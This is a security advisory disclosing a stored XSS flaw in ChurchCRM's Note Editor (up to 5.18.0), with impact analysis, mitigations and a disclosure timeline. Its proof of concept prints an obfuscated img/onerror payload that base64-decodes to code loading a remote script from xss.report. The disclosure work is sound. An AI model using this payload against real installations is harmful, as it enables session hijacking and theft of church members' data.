# ChurchCRM — Stored Cross-Site Scripting in Person Profile Notes (<= 5.18.0)

**Disclosure status:** Reported to vendor (GitHub Security Advisory GHSA-cx82-8xrh-7f5c). No vendor response after 2+ weeks. Potentially addressed in v5.19.0 without acknowledgment.

**Affected product**
- ChurchCRM — versions **<= 5.18.0**

**Summary**
A stored Cross-Site Scripting (XSS) vulnerability in ChurchCRM's Note Editor allows authenticated users to bypass input filters and inject arbitrary JavaScript code that executes in the context of other users' browsers, including administrators. Despite the presence of XSS filters, a specific payload technique successfully bypasses these protections. The malicious code persists in the database and automatically executes when any user views the affected person's profile, enabling session hijacking, privilege escalation, and unauthorized access to sensitive church data.

**Required privileges**
- Any authenticated user account with note-adding permissions

**Impact**
- Session hijacking and account takeover of viewing users
- Privilege escalation when administrators view malicious notes
- Unauthorized access to sensitive church member information
- Data exfiltration through compromised administrative sessions
- Potential for malware distribution and phishing attacks

**Technical Details**
The vulnerability exists in `NoteEditor.php` and other endpoints where XSS filters are present but can be bypassed using a specific payload technique. While ChurchCRM implements some XSS filtering mechanisms, the following payload successfully circumvents these protections:

1. **Filter Bypass**: Existing XSS filters fail to detect the specific payload construction
2. **Base64 Encoding Evasion**: JavaScript execution via `eval(atob())` bypasses string-based filters
3. **HTML Attribute Injection**: Using `onerror` event handler in `<img>` tag context
4. **Widespread Impact**: This same XSS filter bypass technique affects multiple endpoints throughout the application

**CVSS 3.1 Assessment**
- **Score**: 7.3 (High)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N
- **Rationale**: Network-accessible, low complexity, requires low privileges, user interaction required, high confidentiality and integrity impact

**Proof-of-Concept**

1. **Access Note Editor**: Navigate to any person's profile and access the Note Editor:
   ```
   http://[target]/NoteEditor.php?PersonID=[ID]
   ```

2. **Inject Filter-Bypassing Payload**: Enter the specific XSS payload that bypasses ChurchCRM's filters:
   ```html
   "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL1tZT1VSX1dFQkhPT0tdIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== onerror=eval(atob(this.id))>
   ```

3. **Payload Analysis**: This specific construction bypasses XSS filters through:
   - **HTML context breaking**: `">` closes any existing attribute context
   - **Base64 encoding**: Obfuscates JavaScript from string-based filters  
   - **Event handler execution**: `onerror` triggers automatically on image load failure
   - **Dynamic evaluation**: `eval(atob())` executes decoded JavaScript

4. **Trigger Execution**: When any user views the person's profile, the JavaScript executes automatically

5. **Verification**: Check XSS.report dashboard or configured webhook for execution confirmations

**Confirmed results (observed)**
- Successfully bypassed ChurchCRM's XSS filtering mechanisms
- Stored XSS payload persisted in database and rendered without encoding
- Automatic JavaScript execution when other users view the profile
- External script loading confirmed through webhook responses
- Same payload technique confirmed to work across multiple application endpoints

**Attack Scenarios**
1. **Session Hijacking**: Steal session cookies to impersonate administrators and other users
2. **Administrative Actions**: Perform actions as the compromised user, including modifying member data, financial records, or user permissions  
3. **Data Access**: Access sensitive information visible to the compromised user's session
4. **Phishing**: Redirect users to malicious login pages to harvest credentials
5. **Keylogging**: Capture keystrokes to steal passwords and sensitive input

**Mitigation / Workarounds**
- **Immediate**: Restrict note editing to trusted administrators only
- **Recommended vendor fixes**:
  - Implement comprehensive input sanitization for all note content
  - Use proper HTML output encoding when displaying stored content
  - Implement Content Security Policy (CSP) headers
  - Add HTML purification libraries (e.g., DOMPurify) for rich text content
  - Validate and sanitize all user input server-side

**Disclosure timeline**
- 2025-09-25 — Reported via GitHub Security Advisory GHSA-cx82-8xrh-7f5c
- 2025-10-05 — ChurchCRM v5.19.0 released with unspecified security improvements
- 2025-10-08 — No vendor response received; publishing advisory for CVE coordination

**References**
- GitHub Security Advisory: GHSA-cx82-8xrh-7f5c
- ChurchCRM Note Editor: `NoteEditor.php`
- XSS Testing Platform: https://xss.report

**Contact**
- Reporter: uartu0@gmail.com

---

This advisory documents a stored XSS vulnerability that allows any authenticated user to compromise other users' sessions, particularly administrators. The persistent nature of the vulnerability means malicious code continues to execute until the affected note is removed, creating ongoing security risks for all users accessing the compromised profiles.